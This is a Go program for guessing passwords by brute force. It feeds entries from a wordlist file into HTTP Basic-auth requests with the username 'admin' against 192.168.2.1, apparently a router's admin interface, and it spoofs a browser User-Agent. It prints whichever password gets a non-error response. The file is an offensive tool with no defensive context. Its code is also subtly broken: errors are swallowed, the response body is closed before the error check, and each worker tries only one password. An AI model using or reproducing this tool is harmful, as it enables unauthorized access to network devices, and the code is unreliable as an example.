package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"strings"
)

var (
	wguid int = 0
)

type Worker struct {
	wid     int
	client  *http.Client
	request *http.Request
	tpwd    chan string
	pwd     chan string
}

func newRequest(address string) (*http.Request, error) {
	req, err := http.NewRequest("GET", address, nil)
	if err != nil {
		return req, nil
	}
	req.Header.Add("Accept", "text/html,application/xhtml+xml,"+
		"application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Add("User-Agent", "Mozilla/5.0 (X11; widows x86_64) "+
		"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36")
	return req, nil
}

func NewWorker(host string, tpwd, pwd chan string) (*Worker, error) {
	transport := &http.Transport{}
	client := &http.Client{
		Transport: transport,
	}
	req, err := newRequest(host)
	if err != nil {
		return nil, err
	}
	w := &Worker{
		wid:     wguid,
		client:  client,
		request: req,
		tpwd:    tpwd,
		pwd:     pwd,
	}
	wguid += 1
	return w, nil
}

func (w *Worker) Wid() int {
	return w.wid
}

func (w *Worker) Try() {
	line, ok := <-w.tpwd
	if !ok {
		fmt.Println("Recv test password failed ...")
		return
	}
	line = strings.TrimSpace(line)
	w.request.SetBasicAuth("admin", line)
	resp, err := w.client.Do(w.request)
	defer resp.Body.Close()
	if err != nil {
		fmt.Printf("Worker%d try password:%s err:%s\n", w.Wid(), line, err.Error())
		return
	}
	if resp.StatusCode < 400 {
		w.pwd <- line
		return
	}
	fmt.Printf("Worker%d try password:%s code:%d\n", w.Wid(), line, resp.StatusCode)
}

func main() {
	maxcpus := 2 //runtime.NumCPU()
	tpwd := make(chan string, 1)
	pwd := make(chan string, 1)
	filename := "test.txt"
	f, err := os.Open(filename)
	if err != nil {
		fmt.Println(err)
		return
	}
	runtime.GOMAXPROCS(maxcpus)
	go func(f *os.File, tpwd, pwd chan string) {
		defer f.Close()
		scanner := bufio.NewScanner(f)
		var line string
		for scanner.Scan() {
			line = scanner.Text()
			tpwd <- line
			fmt.Printf("Scan text:%s\n", line)
		}
		if err := scanner.Err(); err != nil {
			fmt.Printf("Scan error:%s\n", err.Error())
		}
	}(f, tpwd, pwd)

	for i := 0; i < maxcpus-1; i++ {
		w, err := NewWorker("http://192.168.2.1", tpwd, pwd)
		fmt.Printf("Start worker%d\n", w.Wid())
		if err != nil {
			fmt.Printf("Error:%s\n", err.Error())
			continue
		}
		go w.Try()
	}
	getpwd, ok := <-pwd
	if ok {
		fmt.Printf("Get password:%s\n", getpwd)
		close(pwd)
		close(tpwd)
	} else {
		fmt.Println("Get nothing")
	}
}
